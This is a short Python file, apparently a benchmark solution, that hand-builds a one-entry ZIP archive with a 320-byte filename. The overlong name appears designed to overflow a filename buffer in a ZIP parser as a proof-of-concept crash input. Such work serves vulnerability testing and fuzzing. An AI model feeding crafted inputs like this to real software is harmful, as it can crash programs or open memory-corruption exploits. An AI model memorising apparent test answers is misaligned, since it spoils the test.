import struct
from typing import Optional


class Solution:
    def _make_zip(self, filename: bytes, data: bytes = b"") -> bytes:
        if not isinstance(filename, (bytes, bytearray)):
            filename = str(filename).encode("utf-8", "strict")
        if not isinstance(data, (bytes, bytearray)):
            data = bytes(data)

        fn_len = len(filename)
        extra = b""
        comment = b""

        # Local file header
        local_sig = 0x04034B50
        ver_needed = 20
        gp_flag = 0
        compression = 0
        mod_time = 0
        mod_date = 0
        crc32 = 0
        comp_size = len(data)
        uncomp_size = len(data)
        local_header = struct.pack(
            "<IHHHHHIIIHH",
            local_sig,
            ver_needed,
            gp_flag,
            compression,
            mod_time,
            mod_date,
            crc32,
            comp_size,
            uncomp_size,
            fn_len,
            len(extra),
        )
        local_offset = 0
        local_record = local_header + filename + extra + data

        # Central directory file header
        central_sig = 0x02014B50
        ver_made_by = 20
        disk_start = 0
        int_attr = 0
        ext_attr = 0
        central_header = struct.pack(
            "<IHHHHHHIIIHHHHHII",
            central_sig,
            ver_made_by,
            ver_needed,
            gp_flag,
            compression,
            mod_time,
            mod_date,
            crc32,
            comp_size,
            uncomp_size,
            fn_len,
            len(extra),
            len(comment),
            disk_start,
            int_attr,
            ext_attr,
            local_offset,
        )
        central_record = central_header + filename + extra + comment

        cd_offset = len(local_record)
        cd_size = len(central_record)

        # End of central directory record
        eocd_sig = 0x06054B50
        disk_num = 0
        disk_cd = 0
        entries_disk = 1
        entries_total = 1
        eocd = struct.pack(
            "<IHHHHIIH",
            eocd_sig,
            disk_num,
            disk_cd,
            entries_disk,
            entries_total,
            cd_size,
            cd_offset,
            0,
        )

        return local_record + central_record + eocd

    def solve(self, src_path: str) -> bytes:
        name_len = 320
        filename = (b"A" * (name_len - 4)) + b".txt"
        return self._make_zip(filename, b"")